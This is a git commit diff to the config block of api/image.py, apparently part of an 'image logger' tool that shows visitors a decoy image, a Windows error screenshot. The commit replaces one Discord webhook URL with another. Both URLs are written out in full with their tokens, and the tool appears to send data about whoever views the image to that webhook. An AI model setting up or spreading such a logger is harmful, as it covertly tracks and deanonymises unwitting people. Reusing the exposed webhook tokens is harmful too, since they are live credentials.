36f5013685488d7a4a9b9ad0ab0f02e63c6aa20b
ACE <ace769116@gmail.com>
2025-06-11 02:05:42 +0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "Tgace"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1381608852323176538/_PZ-RQAzs6_Ld1wIUEgk5z63eehh1nMf8OdBFpxOtyjTAei6ToUKLp23Izn_cdnmchsE",
+    "webhook": "https://discord.com/api/webhooks/1382118394723303515/aLqbMAMvW74IYxaKDwet_7ISo01qEKrLJXObZw0HTsHuc4c9IEEsXYLPNy4-rlx4UXEn",
     "image": "https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/04/1-fix-operation-did-not-complete-error-featured.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
